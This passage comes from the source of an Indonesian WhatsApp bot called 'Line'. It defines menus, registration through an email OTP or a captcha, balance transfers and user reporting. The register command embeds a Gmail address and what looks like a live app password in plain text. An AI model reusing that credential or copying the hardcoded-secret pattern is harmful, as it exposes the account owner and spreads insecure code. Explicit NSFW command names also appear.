 • ${prefix}claude
 • ${prefix}cbaby
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'searchmenu':
case 'searchmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("SEARCH  MENU")}
 • ${prefix}google
 • ${prefix}appsstore
 • ${prefix}gimage
 • ${prefix}ytsearch
 • ${prefix}play
 • ${prefix}video
 • ${prefix}audio
 • ${prefix}ytmp4
 • ${prefix}ytmp3
 • ${prefix}ttsearch
 • ${prefix}ttget
 • ${prefix}spotifys
 • ${prefix}pin
 • ${prefix}news
 • ${prefix}wiki
 • ${prefix}liriklagu
 • ${prefix}chord
 • ${prefix}xvideos
 • ${prefix}xnxxs
 • ${prefix}resep
 • ${prefix}bacaresep
 • ${prefix}infocuaca
 • ${prefix}infogempa
 • ${prefix}kalender
 • ${prefix}ppcouple
 • ${prefix}jarak
 • ${prefix}jadwaltv
 • ${prefix}book
 • ${prefix}ebook
 • ${prefix}music
 • ${prefix}jokes
 • ${prefix}crypto
 • ${prefix}cerpen
 • ${prefix}andro1

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'animemenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("ANIME  MENU")}
 • ${prefix}searchcharacter
 • ${prefix}searchmanga
 • ${prefix}rekanime
 • ${prefix}animehug
 • ${prefix}animetrailer
 • ${prefix}animeepisode
 • ${prefix}animesynopsis
 • ${prefix}animchar
 • ${prefix}animepic
 • ${prefix}animewall
 • ${prefix}awaifu

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'funmenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("FUN MENU")}
 • ${prefix}apakah
 • ${prefix}bisakah
 • ${prefix}kapankah
 • ${prefix}cekganteng
 • ${prefix}cekcantik
 • ${prefix}ceklesbi
 • ${prefix}cekgay
 • ${prefix}ceksifat
 • ${prefix}cekjodoh

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'makermenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("MAKER  MENU")}
 • ${_p}txt2img
 • ${_p}txt2imgv2
 • ${_p}txt2imgv3
 • ${_p}txt2imgv4
 • ${_p}txt2imgv5
 • ${_p}txt2imgv6
 • ${_p}emojimix
 • ${_p}attp
 • ${_p}ttp
 • ${_p}brat
 • ${_p}blurimg
 • ${_p}facepalm
 • ${_p}beautiful
 • ${_p}textimg

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'pteromenu':
case 'pteromenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("PTERO  MENU")}
 • ${prefix}createnode
 • ${prefix}installpanel
 • ${prefix}uninstallpanel
 • ${prefix}startwings
 • ${prefix}itema1
 • ${prefix}itema2
 • ${prefix}itema3

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'ppobindonesia': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("PPOB  INDONESIA")}
 • ${prefix}topup-dana
 • ${prefix}topup-gopay
 • ${prefix}topup-ovo
 • ${prefix}pulsa-axis
 • ${prefix}pulsa-indosat
 • ${prefix}pulsa-tsel
 • ${prefix}pulsa-tri
 • ${prefix}pulsa-xl
 • ${prefix}tshopeepay

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'nsfwmenu':
case 'nsfwmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("NSFW  MENU")}
 • ${prefix}nsfw
 • ${prefix}waifu
 • ${prefix}neko
 • ${prefix}shinobu
 • ${prefix}megumin
 • ${prefix}bully
 • ${prefix}cuddle
 • ${prefix}cry
 • ${prefix}hug
 • ${prefix}awoo
 • ${prefix}kiss
 • ${prefix}lick
 • ${prefix}pat
 • ${prefix}smug
 • ${prefix}bonk
 • ${prefix}yeet
 • ${prefix}blush
 • ${prefix}smile
 • ${prefix}wave
 • ${prefix}highfive
 • ${prefix}handhold
 • ${prefix}nom
 • ${prefix}bite
 • ${prefix}glomp
 • ${prefix}slap
 • ${prefix}kill
 • ${prefix}kick
 • ${prefix}happy
 • ${prefix}wink
 • ${prefix}poke
 • ${prefix}dance
 • ${prefix}cringe
 • ${prefix}trap
 • ${prefix}blowjob
 • ${prefix}hentai
 • ${prefix}boobs
 • ${prefix}ass
 • ${prefix}pussy
 • ${prefix}thighs
 • ${prefix}lesbian
 • ${prefix}lewdneko
 • ${prefix}cum

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'ephotomenu':
case 'ephotomenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("EPHOTO  MENU")}
 • ${prefix}glitchtext
 • ${prefix}writetext
 • ${prefix}advancedglow
 • ${prefix}typographytext
 • ${prefix}pixelglitch
 • ${prefix}neonglitch
 • ${prefix}flagtext
 • ${prefix}flag3dtext
 • ${prefix}deletingtext
 • ${prefix}blackpinkstyle
 • ${prefix}glowingtext
 • ${prefix}underwatertext
 • ${prefix}logomaker
 • ${prefix}cartoonstyle
 • ${prefix}papercutstyle
 • ${prefix}watercolortext
 • ${prefix}effectclouds
 • ${prefix}blackpinklogo
 • ${prefix}gradienttext
 • ${prefix}summerbeach
 • ${prefix}luxurygold
 • ${prefix}multicoloredneon
 • ${prefix}sandsummer
 • ${prefix}galaxywallpaper
 • ${prefix}1917style
 • ${prefix}makingneon
 • ${prefix}royaltext
 • ${prefix}freecreate
 • ${prefix}galaxystyle
 • ${prefix}lighteffects

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'cecanmenu':
case 'cecanmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("CECAN  MENU")}
 • ${prefix}hijaber
 • ${prefix}jeni
 • ${prefix}jiso
 • ${prefix}justina
 • ${prefix}rose
 • ${prefix}ryujin
 • ${prefix}vietnam
 • ${prefix}korea
 • ${prefix}indonesian
 • ${prefix}japan
 • ${prefix}thailand
 • ${prefix}china

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'coganmenu':
case 'coganmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("COGAN  MENU")}
 • ${prefix}wuyifan
 • ${prefix}suga
 • ${prefix}parkchanyeol
 • ${prefix}ohsehun
 • ${prefix}luhan
 • ${prefix}kimtaehyung
 • ${prefix}kimsoek
 • ${prefix}kimnanjoon
 • ${prefix}kimminseok
 • ${prefix}kimjunmyeon
 • ${prefix}kimjong
 • ${prefix}kimjondae
 • ${prefix}jungkook
 • ${prefix}jimin
 • ${prefix}jhope
 • ${prefix}huangzitao
 • ${prefix}dohkyungsoo
 • ${prefix}baekhyung

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'toolsmenu':
case 'toolsmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("TOOLS  MENU")}
 • ${prefix}tobase64
 • ${prefix}toori
 • ${prefix}enc
 • ${prefix}enc2
 • ${prefix}noenc
 • ${prefix}toraw
 • ${prefix}togh
 • ${prefix}nuliskanan
 • ${prefix}nuliskiri
 • ${prefix}foliokanan
 • ${prefix}foliokiri
 • ${prefix}beauty
 • ${prefix}flatten
 • ${prefix}addwm
 • ${prefix}translate
 • ${prefix}age
 • ${prefix}remind
 • ${prefix}dictionary
 • ${prefix}dnslookup
 • ${prefix}proxy
 • ${prefix}trackip
 • ${prefix}wastalk
 • ${prefix}cfps
 • ${prefix}setspeed
 • ${prefix}totxt
 • ${prefix}expireddomain
 • ${prefix}cariresep
 • ${prefix}hdvid720p
 • ${prefix}hdvid1k
 • ${prefix}hdvid2k
 • ${prefix}hdvid4k
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'voicemenu':
case 'voicemenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("VOICE  MENU")}
 • ${prefix}bass
 • ${prefix}blown
 • ${prefix}deep
 • ${prefix}earrape
 • ${prefix}fast
 • ${prefix}fat
 • ${prefix}nightcore
 • ${prefix}reverse
 • ${prefix}robot
 • ${prefix}slow
 • ${prefix}smooth
 • ${prefix}tupai
 • ${prefix}echo
 • ${prefix}flanger
 • ${prefix}vaporwave
 • ${prefix}treble
 • ${prefix}vibrato
 • ${prefix}distortion
 • ${prefix}karaoke
 • ${prefix}chipmunk
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'islamicmenu':
case 'islamicmenu-v':
case 'islammenu':
case 'islammenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("ISLAMIC  MENU")}
 • ${prefix}jadwalsholat
 • ${prefix}asmaulhusna
 • ${prefix}niatsholat
 • ${prefix}surah
 • ${prefix}berdoa
 • ${prefix}gislam
 • ${prefix}kataislam
 • ${prefix}pantunislam
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'othermenu':
case 'othermenu-v':
case 'othersmenu':
case 'othersmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("OTHERS  MENU")}
 • ${prefix}jadibot
 • ${prefix}stopjadibot
 • ${prefix}listjadibot
 • ${prefix}ceknickff
 • ${prefix}ceknickml
 • ${prefix}hdimg
 • ${prefix}recolor
 • ${prefix}dehaze
 • ${prefix}hdvid
 • ${prefix}tourl
 • ${prefix}ssweb
 • ${prefix}nobg
 • ${prefix}resize
 • ${prefix}qcstik
 • ${prefix}qckode
 • ${prefix}stiker
 • ${prefix}smeme
 • ${prefix}swm
 • ${prefix}gtts
 • ${prefix}readvo
 • ${prefix}getvideo
 • ${prefix}getmusic
 • ${prefix}cekkhodam
 • ${prefix}toimg
 • ${prefix}tomp3
 • ${prefix}tovn
 • ${prefix}translate
 • ${prefix}listbahasa
 • ${prefix}toanime
 • ${prefix}toreal
 • ${prefix}ytkomen
 • ${prefix}carbon
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'rpgmenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("RPG  MENU")}
 • ${prefix}joinrpg
 • ${prefix}leaverpg
 • ${prefix}mulai
 • ${prefix}adventure
 • ${prefix}inventory
 • ${prefix}makan
 • ${prefix}minum
 • ${prefix}craft
 • ${prefix}jual
 • ${prefix}beli
 • ${prefix}mining
 • ${prefix}mancing

Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

// === Main Menu

case 'daftar':
case 'regis':
case 'register': {
if (db.data.users[m.sender].daftar) return m.reply(`Kamu sudah terdaftar!`)
if (!text) return m.reply(`*METODE DAFTAR*\n#1: ${prefix+command} -email youremail@gmail.com\n#2: ${prefix+command} -captcha\n#3: ${prefix+command} -auto`)
if (args[0] === "-email" && args[1]) {
const email = args[1];
var otp = await randomNomor(1000, 9999);
db.data.users[m.sender].otp = otp;
db.data.users[m.sender].email = `${email}`
try {
const nodemailer = require('nodemailer');
let transporter = nodemailer.createTransport({
service: 'gmail',
auth: {
user: 'lineaja03@gmail.com',
pass: 'zlqt dptn knxm xmym'
}
});
let mailOptions = {
from: 'Line',
to: email,
subject: 'Kode Verifikasi OTP',
html: `
        <div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif; color: #333;">
            <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);">
                
                <!-- Bagian Header dengan Warna Latar Putih -->
                <div style="background-color: #ffffff; padding: 40px; text-align: center; color: #333;">
                    <img src="https://pomf2.lain.la/f/dlmfxc7b.jpg" alt="Hello Line" style="width: 80px; border-radius: 50%; background: rgba(0, 0, 0, 0.05); padding: 10px; margin-bottom: 20px;">
                    <h2 style="font-size: 26px; font-weight: bold; margin: 0;">🚀 Kode Verifikasi OTP 🚀</h2>
                    <p style="margin: 5px 0 0; font-size: 14px;">Akses akunmu dengan aman dan mudah</p>
                </div>
                
                <!-- Bagian Isi Kode OTP -->
                <div style="padding: 30px; text-align: center; background-color: #f8f9fa; color: #333;">
                    <p style="font-size: 18px; color: #333; margin: 0 0 10px;">🔐 Kode OTP kamu adalah:</p>
                    <div style="font-size: 36px; font-weight: bold; color: #4caf50; margin: 20px 0;">
                        ${otp}
                    </div>
                    <a href="https://wa.me/628568782064?text=Kode%20OTP%20saya%20adalah%3A%20${otp}" style="display: inline-block; padding: 12px 30px; background-color: #4caf50; color: white; font-weight: bold; font-size: 16px; text-decoration: none; border-radius: 5px; margin-top: 20px;">
                        🔓 BUKA OTP
                    </a>
                    <p style="margin-top: 25px; font-size: 15px; color: #666;">Masukkan kode ini di obrolanmu dengan Line untuk verifikasi.</p>
                    <p style="font-size: 14px; color: #777; margin-top: 5px;">✨ Terima kasih telah mempercayai layanan kami! ✨</p>
                </div>
                
                <!-- Bagian Footer -->
                <div style="padding: 15px; text-align: center; background-color: #f0f0f0; border-top: 1px solid #ddd;">
                    <p style="font-size: 12px; color: #888; margin: 0;">&copy; 2024 Line. Seluruh hak cipta dilindungi.</p>
                    <p style="font-size: 12px; color: #888; margin: 5px 0 0;">📧 Hubungi kami di <a href="mailto:lineaja03@gmail.com" style="color: #4caf50; text-decoration: none;">lineaja03@gmail.com</a> untuk bantuan lebih lanjut.</p>
                    <p style="font-size: 12px; color: #888; margin-top: 10px;">📞 Telepon: <a href="tel:+628568782064" style="color: #4caf50; text-decoration: none;">+62 856-8782-064</a></p>
                </div>
            </div>
        </div>
    `
};
transporter.sendMail(mailOptions, (error, info) => {
if (error) {
console.log('Error: ' + error);
m.reply('Gagal mengirim kode OTP ke email kamu');
} else {
m.reply('Kode OTP berhasil terkirim ke email kamu');
}
});
} catch (error) {
console.log('Error: ' + error);
m.reply('Gagal mengirim kode OTP ke email kamu');
}} else if (args[0] === "-captcha") {
var angka = await randomNomor(1000, 9999)
db.data.users[m.sender].otp = angka
db.data.users[m.sender].email = '-'
try {
const { CaptchaGenerator } = require("captcha-canvas");
const captcha = new CaptchaGenerator()
.setDimension(250, 450) 
.setCaptcha({text: `${angka}`, size: 60, color: "blue"})
.setDecoy({opacity: 0.5})
.setTrace({color: "blue"});
const buffer = captcha.generateSync();
const uploadFile = { upload: Line.waUploadToServer };
var imageMessage = await prepareWAMessageMedia(
{
image: buffer,
},
uploadFile,
);
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: `\nMasukkan kode verifikasi kamu\nSesuai seperti yang ada digambar...`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: `${monospace("CAPTCHA CODE")}`,
subtitle: '',
imageMessage: imageMessage.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: 'Jgn diedit'}],
})})}
}}, { quoted: m })
Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
} catch (err) {
m.reply('Terjadi kesalahan')
}} else if (args[0] === "-auto") {
const srlnye = createSerial(5)
var angk = await randomNomor(20, 700)
edit2("Mendaftar secara otomatis...", `*Berhasil mendaftar!*\n\n${monospace("INFORMASI  AKUN")}\nNama: Player-${angk}\nID: ${m.sender.split('@')[0]}\nSerial: ${srlnye}`)
db.data.users[m.sender].daftar = true
db.data.users[m.sender].nama = `Player-${angk}`
db.data.users[m.sender].email = '-'
db.data.users[m.sender].serial = `${srlnye}`
addRegisteredUser(m.sender, `Player-${angk}`, srlnye)
}}
break

case 'unregis':
case 'unregister': {
if (!db.data.users[m.sender].daftar) return m.reply('Kamu belum terdaftar!')
if (!args[0]) return m.reply(`Contoh: ${prefix+command} serial\n\nKetik ${prefix}infome untuk cek serial`)
if (args[0] === `${db.data.users[m.sender].serial}`) {
const lastUnregisTime = db.data.users[m.sender].lastUnregisTime || 0;
const currentTime = Date.now();
const sixHoursInMilliseconds = 6 * 60 * 60 * 1000;
if (currentTime - lastUnregisTime < sixHoursInMilliseconds) {
const remainingTime = sixHoursInMilliseconds - (currentTime - lastUnregisTime);
const hours = Math.floor(remainingTime / (60 * 60 * 1000));
const minutes = Math.floor((remainingTime % (60 * 60 * 1000)) / (60 * 1000));
return m.reply(`Kamu hanya bisa unregis setiap 6 jam sekali. Coba lagi dalam ${hours} jam dan ${minutes} menit.`);
}
edit2("Menghapus data...", "Sukses menghapus data!")
delete db.data.users[m.sender]
}}
break

case 'cn':
case 'nickname': {
if (!db.data.users[m.sender].daftar) return m.reply('Kamu belum terdaftar!')
edit2("Mengubah nama...", "Sukses mengubah nama!")
db.data.users[m.sender].nama = `${text}`

}
break

case 'setmenu': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} v1\n\nTersedia: v1, v2, v3`)
if (args[0].startsWith('v')) {
if (!args[0].startsWith('v')) return m.reply(`Harus diawali dengan "v"\nContoh: ${prefix+command} v1`)
if (args[0].length > 2) return m.reply('Maximal 2 karakter!')
tipemenu = args[0]
m.reply('Sukses setmenu ke '+args[0]+'.')
}}
break

case 'setallmenu': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} v1\n\nTersedia: v1, v2, v3`)
if (args[0].startsWith('v')) {
if (!args[0].startsWith('v')) return m.reply(`Harus diawali dengan "v"\nContoh: ${prefix+command} v1`)
if (args[0].length > 2) return m.reply('Maximal 2 karakter!')
tipeallmenu = args[0]
m.reply('Sukses setmenu ke '+args[0]+'.')
}}
break

case 'prefix': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
if (prefixx) return m.reply('Prefix sudah diaktifkan sebelumnya')
prefixx = true
m.reply('Sukses mengaktifkan prefix!')
} else if (args[0] === 'off') {
if (!prefixx) return m.reply('Prefix sudah dinonaktifkan sebelumnya.')
prefixx = false
m.reply('Sukses menonaktifkan prefix!')
}}
break

case 'infome': {
let { rank, rankid } = await ranke(m.sender)
let exp = db.data.users[m.sender].exp
let requireexp = 2400
const maxRequireExp = 36000
while (exp >= requireexp && requireexp < maxRequireExp) {
requireexp += 2400
if (requireexp > maxRequireExp) {
requireexp = maxRequireExp
}}
    let teks = `乂 ${monospace("INFORMASI  AKUN")}
 Nama: ${db.data.users[m.sender].nama}
 Profil: ${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}
 Status: ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}
 Level: ${db.data.users[m.sender].level}
 Exp: ${exp}
 Rank: ${rank} ${rankid}
 Serial: ${db.data.users[m.sender].serial}
 
乂 ${monospace("INFORMASI  CUAN")}
 Gold: ${cekGold(m.sender)} gold
 Saldo: Rp. ${toRupiah(cekSaldo(m.sender))} (${toDolar(cekSaldo(m.sender))})
 Limit: ${cekLimit(m.sender)} limit`
let pps = await Line.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
let background = encodeURIComponent("https://telegra.ph/file/ce0d92af0f361dd51a6ea.png")
let name = encodeURIComponent(pushname)
let avatar = encodeURIComponent(pps)
let rankEncoded = encodeURIComponent(rank)
let rankidEncoded = encodeURIComponent(rankid)    
Line.sendMessage(m.chat, {image: {url: `https://api.vreden.my.id/api/saldo?background=${background}&name=${name}&level=${db.data.users[m.sender].level}&rank=${rankEncoded}&rankid=${rankidEncoded}&exp=${exp}&requireexp=${requireexp}&avatar=${avatar}` }, caption: teks }, {quoted: m })
}
break

case 'infobot': {
let teks = `乂 ${monospace("INFORMASI  LUAR")}
 Nama: ${botname}
 Owner: ${ownername}
 Prefix: Multi Prefix
 Versi: ${version}
 
乂 ${monospace("INFORMASI  DALAM")}
 Platform: Chrome (Ubuntu)
 Type: Cjs (case)
 Total fitur: ${totalFitur()}
 Total error: 2
 Total user: ${Object.values(db.data.users).length} Users`
vreply(teks)
}
break

case 'ch':
case 'channel': {
vreply('Channel WhatsApp Line')
}
break

case 'sc':
case 'script': {
let teks = `${monospace("SCRIPT Line 30K")}\nMau nanya-anya?\n\nChat owner langsung...`
let nyo =  `{\"display_text\":\"CHAT\",\"url\":\"https://wa.me/+${owner}\",\"merchant_url\":\"https://www.google.com\"}`
buttonurl(m.chat, teks, nyo, m)
}
break

case 'cr':
case 'credit': {
let teks = `${monospace("SCRIPT CREDITS")}\n• Line (dev)\n• Sanjaya\n• Verlang\n• Arifi Razzaq\n• Yahya\n• Rafael\nPenyedia api dan dev. bot lainnya...`
sendbutton(m.chat, teks, m)
}
break

case 'gold': {
m.reply(`*Info gold kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Gold: ${cekGold(m.sender)}`)
}
break

case 'saldo': {
m.reply(`*Info limit kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Saldo: Rp. ${toRupiah(cekSaldo(m.sender))}`)
}
break

case 'limit': {
m.reply(`*Info limit kamu*
Name: ${db.data.users[m.sender].nama}
Nomor: ${m.sender.split("@")[0]}
Limit: ${cekLimit(m.sender)}`)
}
break

case 'cekgold': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekGold(froms) == undefined) return m.reply('Dia gak punya gold sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}gold aja`)
let txt = `${monospace("CEK GOLD")}\nNama: ${Line.getName(froms)}\nGold: ${toRupiah(cekGold(froms))}`
m.reply(txt)
}
break

case 'ceksaldo': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekSaldo(froms) == undefined) return m.reply('Dia gak punya saldo sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}saldo aja`)
let txt = `${monospace("CEK SALDO")}\nNama: ${Line.getName(froms)}\nSaldo: ${toRupiah(cekSaldo(froms))}`
m.reply(txt)
}
break

case 'ceklimit': {
if (!froms && !m.quoted) return m.reply(`Tag seseorang yang ingin kamu ${command} nya`)
if (cekLimit(froms) == undefined) return m.reply('Dia gak punya limit sama sekali.')
if (froms == m.sender) return m.reply(`Ketik ${prefix}limit aja`)
let txt = `${monospace("CEK LIMIT")}\nNama: ${Line.getName(froms)}\nLimit: ${toRupiah(cekLimit(froms))}`
m.reply(txt)
}
break

case 'tfsaldo': {
if (!m.mentionedJid[0] && !m.quoted) return m.reply('Tag/kutip pesan seseorang!')
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`)
let receiver = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let amount = parseInt(args[1])
let senderSaldo = cekSaldo(m.sender)
if (isNaN(args[1]) || args[1] <= 1000) return m.reply('Minimal tfsaldo: 1.000');
if (senderSaldo < amount) {
return m.reply(`Saldo tidak cukup. Saldo kamu: Rp. ${toRupiah(senderSaldo)}`)
}
minSaldo(m.sender, amount)
addSaldo(receiver, amount)
m.reply(`*TRANSFER SALDO BERHASIL*
- Pengirim: ${m.sender.split('@')[0]}
- Penerima: ${receiver.split('@')[0]}
- Jumlah: Rp. ${toRupiah(amount)}`)
}
break

case 'owner': {
await Line.sendMessage(from, { 
contacts: { 
displayName: `${list.length} kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 99999999, 
isForwarded: true,
mentionedJid: null
}}, {quoted: m})
}
break

case 'ping':
case 'ping-v':
case 'srvinfo': {
const release = os.release()
const arch = os.arch()
const nodeVersion = process.version
const cpus = os.cpus()
const cpuModel = cpus[0].model
const cpuSpeed = cpus[0].speed
const loadAverage = os.loadavg()
const cpuStatus = cpus.map(cpu => `Idle ${cpu.times.idle}ms, User ${cpu.times.user}ms, Sys ${cpu.times.sys}ms`)
const cpuUsage = cpus.map(cpu => ((cpu.times.user + cpu.times.sys) / (cpu.times.user + cpu.times.sys + cpu.times.idle) * 100).toFixed(2) + '%').join(', ')
const totalMem = os.totalmem()
const freeMem = os.freemem()
const usedMem = totalMem - freeMem
const nou = require("node-os-utils")
var tot = await nou.drive.info()
const speed = require('performance-now')
let timestamp = speed()
let latensi = speed() - timestamp
const responseText = `
 *INFO SERVER*
• OS: ${nou.os.type()} (${release})
• Arsitektur: ${arch}
• Versi Node.js: ${nodeVersion}
• IP Address: ${nou.os.ip()}

 *CPU SISTEM*
• Model: ${cpuModel}
• Kecepatan: ${cpuSpeed} MHz
• Beban CPU: ${cpuUsage}
• Load Average (1, 5, 15 menit): ${loadAverage.join(', ')}

 *MEMORI (RAM)*
• Total: ${formatp(totalMem)}
• Digunakan: ${formatp(usedMem)}
• Tersedia: ${formatp(freeMem)}

 *PENYIMPANAN*
• Total: ${tot.totalGb} GB
• Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
• Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

 *PING*
• Latensi: ${latensi.toFixed(4)} detik
`
Line.sendMessage(m.chat, { text: responseText.trim() }, { quoted: ftext })
}
break

case 'runtime': {
m.reply(`Bot runtime: ${runtime(process.uptime())}`)
}
break

case 'payment': {
let yow = `${monospace("ALL  PAYMENT")}

*(E-WALLET)*

1. DANA
- ${dana}
2. Gopay
- ${gopay}
3. OVO
- ${ovo}

*(REKENING)*
- ${rek}

© ${storename}`
Line.sendMessage(m.chat, {text: yow }, {quoted: ftext})
}
break

case 'totalfeature':
case 'totalfitur': {
m.reply(`${monospace("TOTAL  FITUR")}\nTotal: ${totalFitur()}`)
}
break

case 'request':
case 'saran': {
  if (!text) return m.reply('Berikan penjelasan, apa yang ingin kamu sarankan.');
  let senderNumber = m.sender.split("@")[0];
  let requestId = Date.now().toString();
  permintaan[requestId] = {
    sender: senderNumber,
    text: text,
    timestamp: new Date(),
    status: 'Dibuat'
  };
  Line.sendMessage(owner + "@s.whatsapp.net", {
    text: `*Permintaan dari user*\nID: ${requestId}\nNomor: ${senderNumber}\nTeks: ` + `${kapital(text)}`
  }, {
    quoted: fkontak
  });
  await m.reply('Permintaan berhasil terkirim!');
}
break

case 'cekrequest':
case 'ceksaran': {
  let requestId = text.trim();
  if (!permintaan[requestId]) return m.reply('ID permintaan tidak ditemukan atau permintaan sudah tidak valid.');
  let request = permintaan[requestId];
  let permintaanText = `Detail Permintaan:\n\nID: ${requestId}\nNomor: ${request.sender}\nTeks: ${request.text}\nWaktu: ${request.timestamp}\nStatus: ${request.status}`;
  m.reply(permintaanText);
}
break

case 'lapor':
case 'report': {
  if (!text) return m.reply('Berikan penjelasan, bug apa yang kamu temui');
  let senderNumber = m.sender.split("@")[0];
  let reportId = Date.now().toString();
  laporan[reportId] = {
    sender: senderNumber,
    text: text,
    timestamp: new Date(),
    status: 'Dibuat'
  };
  Line.sendMessage(owner + "@s.whatsapp.net", {
    text: `*Laporan dari user*\nID: ${reportId}\nNomor: ${senderNumber}\nTeks: ` + `${kapital(text)}`
  }, {
    quoted: fkontak
  })
  await m.reply('Laporan berhasil terkirim!')
}
break

case 'balas':
case 'reply': {
  let args = text.split(' ')
  let reportId = args[0]
  let replyText = args.slice(1).join(' ')
  if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
  let recipient = laporan[reportId].sender + '@s.whatsapp.net'
  Line.sendMessage(recipient, {
